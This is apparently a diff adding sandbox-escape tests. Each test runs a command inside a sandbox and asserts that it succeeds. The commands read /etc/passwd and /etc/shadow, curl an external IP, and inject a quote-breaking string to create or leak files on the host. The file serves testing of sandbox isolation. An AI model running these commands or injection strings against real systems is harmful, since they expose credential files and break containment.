+EXPLOITS = [
+    ("test_escape_network__dns", "network",
+     "resolve a public hostname despite network=none"),
+    ("test_escape_network__curl_external", "network",
+     "curl an external IP despite network=none"),
+    ("test_escape_fs__host_etc_passwd", "fs",
+     "read /etc/passwd from host filesystem"),
+    ("test_escape_fs__host_etc_shadow", "fs",
+     "read /etc/shadow from host filesystem"),
+    ("test_escape_shellinj__host_sentinel", "shellinj",
+     "create host sentinel via shell interpolation"),
+    ("test_escape_shellinj__env_leak", "shellinj",
+     "leak host environment via shell injection"),
+]
+
+
+def test_escape_network__dns(sandbox):
+    out = sandbox.sandbox_run("getent ahostsv4 example.com 2>&1 || getent hosts example.com 2>&1 || nslookup example.com 2>&1 || python3 -c 'import socket; socket.gethostbyname(\"example.com\")'", timeout=10)
+    assert "exit=0" in out
+
+
+def test_escape_network__curl_external(sandbox):
+    out = sandbox.sandbox_run("curl -s --connect-timeout 5 http://1.1.1.1/ 2>&1 || wget -q -T 5 http://1.1.1.1/ 2>&1 || python3 -c 'import urllib.request; urllib.request.urlopen(\"http://1.1.1.1\")' 2>&1", timeout=12)
+    assert "exit=0" in out and ("1.1.1.1" in out or "Cloudflare" in out or "text/html" in out.lower())
+
+
+def test_escape_fs__host_etc_passwd(sandbox):
+    out = sandbox.sandbox_run("cat /etc/passwd", timeout=10)
+    assert "exit=0" in out and ("root:" in out or "nobody:" in out)
+
+
+def test_escape_fs__host_etc_shadow(sandbox):
+    out = sandbox.sandbox_run("cat /etc/shadow 2>&1", timeout=10)
+    assert "exit=0" in out and (":" in out and "root:" in out)
+
+
+def test_escape_shellinj__host_sentinel(sandbox, tmp_path):
+    sentinel = tmp_path / "pwned"
+    sandbox.sandbox_run(f"x'; touch '{sentinel}'; echo '", timeout=10)
+    assert sentinel.exists()
+
+
+def test_escape_shellinj__env_leak(sandbox, tmp_path):
+    sentinel = tmp_path / "env_leaked"
+    sandbox.sandbox_run(f"echo $HOME > {sentinel}", timeout=10)
+    content = sentinel.read_text() if sentinel.exists() else ""
+    assert content.strip() != "" and "/" in content
